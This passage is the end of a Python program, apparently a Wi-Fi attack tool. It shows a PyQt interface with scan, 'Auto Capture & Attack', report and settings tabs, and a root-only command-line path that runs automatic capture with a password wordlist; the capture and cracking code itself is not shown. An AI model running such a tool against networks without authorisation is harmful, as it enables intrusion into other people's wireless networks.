                self.setGeometry(100, 100, 1000, 700)
                self.scanner = WiFiScanner(interface=args.interface, output_dir=args.output, dry_run=args.dry_run)
                self.scanner.max_attempts = args.attempts
                self.scanner.scan_duration = args.duration
                self.scanner.wordlist = args.wordlist
                # Use scanner's logger for GUI operations
                self.logger = self.scanner.logger
                self.init_ui()

            def init_ui(self):
                tabs = QtWidgets.QTabWidget()
                self.setCentralWidget(tabs)

                # Dashboard Tab
                dashboard = QtWidgets.QWidget()
                dash_layout = QtWidgets.QVBoxLayout()
                status_layout = QtWidgets.QHBoxLayout()
                self.status_label = QtWidgets.QLabel("Status: Ready")
                status_layout.addWidget(self.status_label)
                
                # Add dry-run indicator if enabled
                if args.dry_run:
                    dry_run_label = QtWidgets.QLabel("[DRY RUN MODE]")
                    dry_run_label.setStyleSheet("color: orange; font-weight: bold;")
                    status_layout.addWidget(dry_run_label)
                
                dash_layout.addLayout(status_layout)
                dashboard.setLayout(dash_layout)
                tabs.addTab(dashboard, "Dashboard")

                # Scan Tab
                scan_tab = QtWidgets.QWidget()
                scan_layout = QtWidgets.QVBoxLayout()
                self.scan_btn = QtWidgets.QPushButton("Comprehensive Scan")
                self.scan_btn.clicked.connect(self.run_scan)
                scan_layout.addWidget(self.scan_btn)
                self.scan_results = QtWidgets.QTextEdit()
                scan_layout.addWidget(self.scan_results)
                scan_tab.setLayout(scan_layout)
                tabs.addTab(scan_tab, "Scan")

                # Attack Tab
                attack_tab = QtWidgets.QWidget()
                attack_layout = QtWidgets.QVBoxLayout()
                self.attack_btn = QtWidgets.QPushButton("Auto Capture & Attack")
                self.attack_btn.clicked.connect(self.run_attack)
                attack_layout.addWidget(self.attack_btn)
                self.attack_results = QtWidgets.QTextEdit()
                attack_layout.addWidget(self.attack_results)
                attack_tab.setLayout(attack_layout)
                tabs.addTab(attack_tab, "Attack")

                # Results Tab
                results_tab = QtWidgets.QWidget()
                results_layout = QtWidgets.QVBoxLayout()
                self.report_btn = QtWidgets.QPushButton("Generate HTML Report")
                self.report_btn.clicked.connect(self.generate_report)
                results_layout.addWidget(self.report_btn)
                self.report_status = QtWidgets.QLabel("")
                results_layout.addWidget(self.report_status)
                results_tab.setLayout(results_layout)
                tabs.addTab(results_tab, "Results")

                # Settings Tab
                settings_tab = QtWidgets.QWidget()
                settings_layout = QtWidgets.QFormLayout()
                self.interface_input = QtWidgets.QLineEdit(args.interface)
                self.output_input = QtWidgets.QLineEdit(args.output)
                self.duration_input = QtWidgets.QSpinBox()
                self.duration_input.setValue(args.duration)
                self.attempts_input = QtWidgets.QSpinBox()
                self.attempts_input.setValue(args.attempts)
                self.wordlist_input = QtWidgets.QLineEdit(args.wordlist)
                settings_layout.addRow("Interface", self.interface_input)
                settings_layout.addRow("Output Dir", self.output_input)
                settings_layout.addRow("Scan Duration", self.duration_input)
                settings_layout.addRow("Max Attempts", self.attempts_input)
                settings_layout.addRow("Wordlist", self.wordlist_input)
                settings_tab.setLayout(settings_layout)
                tabs.addTab(settings_tab, "Settings")

                # Connect output directory change
                self.output_input.textChanged.connect(self.update_output_dir)

            def update_output_dir(self):
                self.scanner.output_dir = self.output_input.text()

            def run_scan(self):
                # Disable scan button to prevent multiple clicks
                self.scan_btn.setEnabled(False)
                self.status_label.setText("Status: Scanning...")
                QtWidgets.QApplication.processEvents()
                self.scanner.interface = self.interface_input.text()
                self.scanner.output_dir = self.output_input.text()
                self.scanner.scan_duration = self.duration_input.value()
                self.scanner.max_attempts = self.attempts_input.value()
                self.scanner.wordlist = self.wordlist_input.text()
                
                import traceback

                # Run scan in a separate thread to prevent UI freezing
                def scan_thread():
                    try:
                        networks = self.scanner.comprehensive_scan()
                        result_text = "\n".join([f"{n.essid} ({n.bssid}) - {n.encryption} - Power: {n.power}" for n in networks.values()])
                        # Create a custom event with the scan results
                        event = QtCore.QEvent(QtCore.QEvent.Type(QtCore.QEvent.User + 3))
                        event.result_text = result_text
                        QtCore.QMetaObject.invokeMethod(
                            QtWidgets.QApplication.instance(),
                            "postEvent",
                            QtCore.Qt.QueuedConnection,
                            QtCore.Q_ARG(QtCore.QObject, self),
                            QtCore.Q_ARG(QtCore.QEvent, event)
                        )
                    except Exception as e:
                        self.logger.error(f"Scan error: {e}")
                        # Log the full exception for better debugging
                        self.logger.error(f"Scan exception details: {traceback.format_exc()}")
                        # Update UI to show error
                        event = QtCore.QEvent(QtCore.QEvent.Type(QtCore.QEvent.User + 4))
                        QtCore.QMetaObject.invokeMethod(
                            QtWidgets.QApplication.instance(),
                            "postEvent",
                            QtCore.Qt.QueuedConnection,
                            QtCore.Q_ARG(QtCore.QObject, self),
                            QtCore.Q_ARG(QtCore.QEvent, event)
                        )

                # Start the thread
                thread = threading.Thread(target=scan_thread)
                thread.daemon = True
                thread.start()
                
            def run_attack(self):
                # Disable attack button to prevent multiple clicks
                self.attack_btn.setEnabled(False)
                self.status_label.setText("Status: Attacking...")
                QtWidgets.QApplication.processEvents()
                
                # Update scanner settings
                self.scanner.interface = self.interface_input.text()
                self.scanner.output_dir = self.output_input.text()
                self.scanner.scan_duration = self.duration_input.value()
                self.scanner.max_attempts = self.attempts_input.value()
                self.scanner.wordlist = self.wordlist_input.text()
                
                # Run in a separate thread to prevent UI freezing
                def attack_thread():
                    try:
                        # Use configurable timeout from settings
                        timeout = self.duration_input.value() * 60  # Convert minutes to seconds
                        self.scanner.auto_capture_with_retry(max_runtime=timeout)
                        # Update UI from main thread
                        QtWidgets.QApplication.instance().postEvent(
                            self,
                            QtCore.QEvent(QtCore.QEvent.Type(QtCore.QEvent.User + 1))
                        )
                    except Exception as e:
                        self.logger.error(f"Attack error: {e}")
                        # Log the full exception for better debugging
                        import traceback
                        self.logger.error(f"Attack exception details: {traceback.format_exc()}")
                        # Update UI to show error
                        QtWidgets.QApplication.instance().postEvent(
                            self,
                            QtCore.QEvent(QtCore.QEvent.Type(QtCore.QEvent.User + 2))
                        )
                
                # Start the thread
                thread = threading.Thread(target=attack_thread)
                thread.daemon = True  # Thread will exit when main program exits
                thread.start()
                
            def event(self, event):
                # Custom event handling for thread completion
                if event.type() == QtCore.QEvent.User + 1:
                    # Attack success event
                    self.attack_results.setText("Attack completed. See logs and output directory for details.")
                    self.status_label.setText("Status: Attack Complete")
                    # Re-enable the attack button
                    self.attack_btn.setEnabled(True)
                    return True
                elif event.type() == QtCore.QEvent.User + 2:
                    # Attack error event
                    self.attack_results.setText("Attack failed. Check logs for details.")
                    self.status_label.setText("Status: Attack Failed")
                    # Re-enable the attack button
                    self.attack_btn.setEnabled(True)
                    return True
                elif event.type() == QtCore.QEvent.User + 3:
                    # Scan success event
                    self.scan_results.setText(event.result_text)
                    self.status_label.setText("Status: Scan Complete")
                    # Re-enable the scan button
                    self.scan_btn.setEnabled(True)
                    return True
                elif event.type() == QtCore.QEvent.User + 4:
                    # Scan error event
                    self.scan_results.setText("Scan failed. Check logs for details.")
                    self.status_label.setText("Status: Scan Failed")
                    # Re-enable the scan button
                    self.scan_btn.setEnabled(True)
                    return True
                elif event.type() == QtCore.QEvent.User + 5:
                    # Report success event
                    self.report_status.setText("HTML report generated in output directory.")
                    # Re-enable the report button
                    self.report_btn.setEnabled(True)
                    return True
                elif event.type() == QtCore.QEvent.User + 6:
                    # Report error event
                    self.report_status.setText("Failed to generate report. Check logs for details.")
                    # Re-enable the report button
                    self.report_btn.setEnabled(True)
                    return True
                return super().event(event)

            def generate_report(self):
                # Disable report button to prevent multiple clicks
                self.report_btn.setEnabled(False)
                self.report_status.setText("Generating report...")
                QtWidgets.QApplication.processEvents()
                
                # Run report generation in a separate thread
                def report_thread():
                    try:
                        self.scanner.generate_report()
                        # Create a success event
                        event = QtCore.QEvent(QtCore.QEvent.Type(QtCore.QEvent.User + 5))
                        QtWidgets.QApplication.instance().postEvent(self, event)
                    except Exception as e:
                        self.logger.error(f"Report generation error: {e}")
                        # Log the full exception for better debugging
                        import traceback
                        self.logger.error(f"Report exception details: {traceback.format_exc()}")
                        # Create an error event
                        event = QtCore.QEvent(QtCore.QEvent.Type(QtCore.QEvent.User + 6))
                        QtWidgets.QApplication.instance().postEvent(self, event)
                
                # Start the thread
                thread = threading.Thread(target=report_thread)
                thread.daemon = True
                thread.start()

        app = QtWidgets.QApplication(sys.argv)
        window = WiFiScannerGUI()
        window.show()
        sys.exit(app.exec_())
    else:
        # Check if running as root/admin (platform-specific)
        import platform
        if platform.system() == "Linux" and os.geteuid() != 0:
            logging.error("This script requires root privileges. Please run with sudo.")
            sys.exit(1)
        elif platform.system() == "Windows":
            # On Windows, check for admin privileges
            import ctypes
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            except Exception:
                is_admin = False
            if not is_admin:
                logging.error("This script requires administrator privileges. Please run as administrator.")
                sys.exit(1)
        # Initialize scanner
        scanner = WiFiScanner(interface=args.interface, output_dir=args.output, dry_run=args.dry_run)
        scanner.max_attempts = args.attempts
        scanner.scan_duration = args.duration
        scanner.wordlist = args.wordlist
        # Check dependencies
        if not scanner.check_dependencies():
            sys.exit(1)
        try:
            if args.scan_only:
                # Perform single comprehensive scan
                scanner.comprehensive_scan()
                scanner.save_results()
                scanner.generate_report()
            else:
                # Start automatic capture with retry
                scanner.auto_capture_with_retry()
        except KeyboardInterrupt:
            scanner.logger.info("Scan interrupted by user")
        except Exception as e:
            scanner.logger.error(f"Unexpected error: {e}")
        finally:
            scanner.cleanup()

if __name__ == "__main__":
    main()
